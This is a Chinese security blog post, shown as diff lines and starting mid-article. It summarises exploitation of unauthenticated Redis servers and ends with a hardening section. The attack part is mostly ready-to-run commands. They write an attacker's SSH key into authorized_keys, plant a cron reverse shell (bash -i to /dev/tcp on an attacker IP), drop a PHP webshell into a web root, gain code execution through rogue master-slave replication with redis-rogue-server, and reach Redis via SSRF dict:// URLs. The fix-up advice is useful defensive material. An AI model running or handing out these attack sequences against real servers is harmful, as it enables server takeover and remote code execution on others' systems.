+<p>2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
+<h4 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h4><p>1.在攻击机本地生成公钥文件：</p>
+<p>需要为我们的公钥文件设置一个私钥</p>
+<p>公钥文件默认路径：/root/.ssh/id_rsa.pub</p>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/3.jpg"></p>
+<pre><code>具体命令：
+ssh-keygen -t rsa
+cd /root/.ssh
+ls
+cat id_rsa.pub
+</code></pre>
+<p>然后通过未授权访问目标机</p>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/4.jpg"></p>
+<p>具体命令</p>
+<pre><code>redis-cli -h 192.168.33.134        #连接目标主机redis
+config get dir                  #检查当前工作目录
+config get dbfilename              #检查备份文件名
+config set dir /root/.ssh/         #设置工作目录
+config set dbfilename authorized_keys #设置备份文件名
+set xz &quot;\n\n\n 公钥 \n\n\n&quot;         #将公钥写入xz健
+save                         #进行备份     
+</code></pre>
+<p>利用公钥进行SSH登录攻击机</p>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/5.jpg"></p>
+<h3 id="2、利用计划任务反弹shell"><a href="#2、利用计划任务反弹shell" class="headerlink" title="2、利用计划任务反弹shell"></a>2、利用计划任务反弹shell</h3><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h4><p>我们都知道crontab是做计划任务的，启动的任务存放在/var/spool/cron中，root可以修改计划任务，可以将执行命令反弹shell直接写入计划任务中</p>
+<h4 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a>条件：</h4><p>root启用Redis</p>
+<h4 id="详细步骤：-1"><a href="#详细步骤：-1" class="headerlink" title="详细步骤："></a>详细步骤：</h4><p>先在攻击机使用nc监听8888端口<code>nc -lvp 8888</code></p>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/8.jpg"></p>
+<p>然后去操作Redis，具体命令：</p>
+<pre><code>redis-cli -h 192.168.33.134            #连接redis
+ flushall                           #清除所有键值
+config set dir /var/spool/cron/crontabs/  #设置工作目录  
+config set dbfilename shell               #备份名称
+set xz &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.33.131/8888 0&gt;&amp;1\n&quot;     #将反弹shell写入xz键值
+save                             #写入工作目录的shell文件
+</code></pre>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/9.jpg"></p>
+<p>看监听的命令行窗口已经有弹回来的shell了（这里有很多的坑，写入会出现乱码和不回弹的情况，最好还是用centos测试吧）</p>
+<p>ubantu的坑参考这个<a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/11/15/5dce507a41df5/">https://www.dazhuanlan.com/2019/11/15/5dce507a41df5/</a></p>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/10.jpg"></p>
+<h3 id="3、Redis直接写webshell"><a href="#3、Redis直接写webshell" class="headerlink" title="3、Redis直接写webshell"></a>3、Redis直接写webshell</h3><h4 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h4><p>知道网站绝对路径，并且需要增删改查权限</p>
+<p>补充：若不知道物理路径，可尝试寻找网站的应用程序错误或者常见绝对路径去尝试。</p>
+<h4 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h4><pre><code>redis-cli -h 192.168.3.134     #连接Redis
+config set dir /www/admin/localhost_80/wwwroot    #设置要写入shell的路径
+set xxx &quot;\n\n\n&lt;?php phpinfo() ;?&gt;\n\n\n&quot; 
+config set dbfilename phpinfo.php 
+save
+</code></pre>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/11.jpg"></p>
+<p>成功写入</p>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/12.jpg"></p>
+<h3 id="4、Redis主从复制getshell"><a href="#4、Redis主从复制getshell" class="headerlink" title="4、Redis主从复制getshell"></a>4、Redis主从复制getshell</h3><h4 id="原理：-2"><a href="#原理：-2" class="headerlink" title="原理："></a>原理：</h4><p>​     Redis如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p>​  在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
+<h4 id="条件：-3"><a href="#条件：-3" class="headerlink" title="条件："></a>条件：</h4><p>Redis 版本(4.x~5.0.5)（新增模块功能，通过C语言并编译出恶意.so文件）</p>
+<h4 id="详细步骤：-2"><a href="#详细步骤：-2" class="headerlink" title="详细步骤："></a>详细步骤：</h4><p>模拟主从关系</p>
+<pre><code>root@kali:~/桌面# redis-cli -h 192.168.33.134
+192.168.33.134:6379&gt; slaveof 192.168.33.131 6379
+OK
+192.168.33.134:6379&gt; get xz
+(nil)
+192.168.33.134:6379&gt; exit
+root@kali:~/桌面# redis-cli
+127.0.0.1:6379&gt; get xz
+(nil)
+127.0.0.1:6379&gt; set xz xz
+OK
+127.0.0.1:6379&gt; exit
+root@kali:~/桌面# redis-cli -h 192.168.33.134
+192.168.33.134:6379&gt; get xz
+&quot;xz&quot;
+192.168.33.134:6379&gt; 
+</code></pre>
+<p>在Kali和目标机都需要关闭redis.conf的保护模式（改为protected-mode no）</p>
+<p>设置主从关系</p>
+<pre><code>root@kali:~/桌面# redis-cli -h 192.168.33.134
+192.168.33.134:6379&gt; slaveof 192.168.33.131 6379
+OK
+</code></pre>
+<p>在kali下载利用工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">下载地址</a>可直接用git clone</p>
+<p>下载之后cd进入RedisModulesSDK目录使用make编译，当然不想编译也可以用作者给出的默认exp.so也是可以的</p>
+<p>有两种使用方法</p>
+<p>一种是交互式shell,另一种是反弹shell</p>
+<p>交互shell演示：</p>
+<pre><code>python3 redis-rogue-server.py --rhost 192.168.33.134 --lhost 192.168.33.131 --exp module.so
+
+根据提示输入i进入交互shell
+</code></pre>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/16.jpg"></p>
+<p>反弹shell</p>
+<pre><code>python3 redis-rogue-server.py --rhost 192.168.33.134 --lhost 192.168.33.131 --exp module.so
+根据提示输入r，接着输入ip和端口进行反弹
+</code></pre>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/15.jpg"></p>
+<p>ps：redis主从RCE打多了会出现redis瘫痪的情况，所以不到万不得已，尽量不要打主从</p>
+<h3 id="5、结合SSRF进行利用"><a href="#5、结合SSRF进行利用" class="headerlink" title="5、结合SSRF进行利用"></a>5、结合SSRF进行利用</h3><p>原理：利用dict协议</p>
+<p>条件：root启用redis</p>
+<p>使用pikachu的靶场，，gopher目前比较少见，这里采用dict协议，目标机需要安装dict协议</p>
+<p>详细步骤：</p>
+<pre><code>dict://192.168.33.134:6379/set:xz:xz
+dict://192.168.33.134:6379/config:set:dir:/www/wwwroot/
+dict://192.168.33.134:6379/config:set:dbfilename:xz.php   #直接写入&lt;&gt;会被实体编码，？直接被截断
+
+#采用主从复制写入
+dict://192.168.33.134:6379/slaveof:192.168.133.131:6379
+#登入kali写shell
+#方法和上面的一样，看别人文章，在web开启主从是可以的，但是我不知什么原因连接失败
+</code></pre>
+<p>失败截图：</p>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/18.jpg"></p>
+<p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/17.jpg"></p>
+<h3 id="6、redis写lua"><a href="#6、redis写lua" class="headerlink" title="6、redis写lua"></a>6、redis写lua</h3><p>redis2.6之前内置了lua脚本环境在redis未授权的情况下可以利用lua执行系统命令</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a></p>
+<h1 id="批量检测未授权redis脚本"><a href="#批量检测未授权redis脚本" class="headerlink" title="批量检测未授权redis脚本"></a>批量检测未授权redis脚本</h1><p><a target="_blank" rel="noopener" href="https://github.com/Ridter/hackredis">https://github.com/Ridter/hackredis</a></p>
+<h1 id="redis未授权漏洞应急响应案例："><a href="#redis未授权漏洞应急响应案例：" class="headerlink" title="redis未授权漏洞应急响应案例："></a>redis未授权漏洞应急响应案例：</h1><p>redis未授权访问致远程植入挖矿脚本（防御篇）</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/eUTZsGUGSO0AeBUaxq4Q2w">https://mp.weixin.qq.com/s/eUTZsGUGSO0AeBUaxq4Q2w</a></p>
+<h1 id="利用拓展："><a href="#利用拓展：" class="headerlink" title="利用拓展："></a>利用拓展：</h1><p>Windows下如何getshell？</p>
+<pre><code>写入webshell，需要知道web路径
+写入启动项，需要目标服务器重启
+写入MOF，MOF每隔5秒钟会自动执行一次，适用于Windows2003。
+</code></pre>
+<h1 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h1><h4 id="1、禁止一些高危命令（重启redis才能生效"><a href="#1、禁止一些高危命令（重启redis才能生效" class="headerlink" title="1、禁止一些高危命令（重启redis才能生效)"></a>1、禁止一些高危命令（重启redis才能生效)</h4><ul>
+<li>修改 redis.conf 文件，禁用远程修改 DB 文件地址</li>
+</ul>
+<pre><code>rename-command FLUSHALL &quot;&quot;
+
+rename-command CONFIG &quot;&quot;
+
+rename-command EVAL &quot;&quot;
+</code></pre>
+<ul>
+<li>或者通过修改redis.conf文件，改变这些高危命令的名称</li>
+</ul>
+<pre><code>rename-command FLUSHALL &quot;name1&quot;
+
+rename-command CONFIG &quot;name2&quot;
+
+rename-command EVAL &quot;name3&quot;
+</code></pre>
+<h4 id="2、以低权限运行-Redis-服务（重启redis才能生效）"><a href="#2、以低权限运行-Redis-服务（重启redis才能生效）" class="headerlink" title="2、以低权限运行 Redis 服务（重启redis才能生效）"></a>2、以低权限运行 Redis 服务（重启redis才能生效）</h4><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
+<pre><code>groupadd -r redis &amp;&amp; useradd -r -g redis redis
+</code></pre>
+<h4 id="3、为-Redis-添加密码验证（重启redis才能生效）"><a href="#3、为-Redis-添加密码验证（重启redis才能生效）" class="headerlink" title="3、为 Redis 添加密码验证（重启redis才能生效）"></a>3、为 Redis 添加密码验证（重启redis才能生效）</h4><p>修改 redis.conf 文件，添加</p>
+<pre><code>requirepass mypassword
+（注意redis不要用-a参数，明文输入密码，连接后使用auth认证）
+</code></pre>
+<h4 id="4、禁止外网访问-Redis（重启redis才能生效）"><a href="#4、禁止外网访问-Redis（重启redis才能生效）" class="headerlink" title="4、禁止外网访问 Redis（重启redis才能生效）"></a>4、禁止外网访问 Redis（重启redis才能生效）</h4><p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p>
+<pre><code>bind 127.0.0.1
+</code></pre>
+<p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p>
+<h4 id="5、修改默认端口"><a href="#5、修改默认端口" class="headerlink" title="5、修改默认端口"></a>5、修改默认端口</h4><p>修改配置文件redis.conf文件</p>
+<pre><code>Port 6379
+</code></pre>
+<p>默认端口是6379，可以改变成其他端口（不要冲突就好）</p>
+<h4 id="6、保证-authorized-keys-文件的安全"><a href="#6、保证-authorized-keys-文件的安全" class="headerlink" title="6、保证 authorized_keys 文件的安全"></a>6、保证 authorized_keys 文件的安全</h4><p>为了保证安全，您应该阻止其他用户添加新的公钥。</p>
+<ul>
+<li>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</li>
+</ul>
+<pre><code>chmod 400 ~/.ssh/authorized_keys
+</code></pre>
+<ul>
+<li>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:</li>
+</ul>
+<pre><code>chattr +i ~/.ssh/authorized_keys
+</code></pre>
+<ul>
+<li>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 权限：</li>
+</ul>
+<pre><code>chattr +i ~/.ssh
+</code></pre>
+<h4 id="7、设置防火墙策略"><a href="#7、设置防火墙策略" class="headerlink" title="7、设置防火墙策略"></a>7、设置防火墙策略</h4><p>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达 </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2020-2021 Alex
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
